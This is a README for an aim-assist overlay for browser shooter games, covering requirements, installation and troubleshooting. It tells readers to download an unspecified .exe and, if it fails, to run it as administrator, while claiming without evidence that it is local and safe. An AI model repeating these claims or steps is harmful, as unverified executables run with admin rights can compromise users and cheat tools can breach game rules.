📖 Project Overview

The xios-aim-assist-script provides a visual overlay for your web browser. This tool helps you maintain aim while playing supported first-person shooter games. It draws a crosshair on your screen and shows indicators when targets enter your field of view.

⚙️ System Requirements

  • Operating System: Windows 10 or Windows 11
  • Browser: Google Chrome, Microsoft Edge, or Brave
  • Memory: At least 4GB of RAM

📥 Download and Installation

Follow these steps to install the tool on your computer:

  1. Visit the official release page.
  2. Select the latest version file ending in .exe.
  3. Download the file to your desktop.
  4. Double-click the downloaded file to begin the installation.
  5. Follow the on-screen prompts to complete the setup.

🚀 How to Use the Script

Once you finish the installation, you can start the application using the shortcut on your desktop. When the application starts, it creates a transparent window over your browser. You can customize the crosshair size and color through the settings menu inside the application. Ensure your game runs in borderless window mode for the best performance.

🛠️ Troubleshooting Common Issues

If the overlay does not appear, ensure that your game runs in Windowed or Borderless Window mode. Fullscreen mode prevents overlays from drawing on top of the game window. Check that you have the latest version of your browser installed. If the script fails to launch, restart your computer and run the file as an administrator.

🛡️ Security and Usage

This script performs local image processing during gameplay. It does not modify game files or inject code into game processes. Use this tool only in games where visual overlays remain permitted by the developer. Follow all community guidelines and terms of service for the games you play.
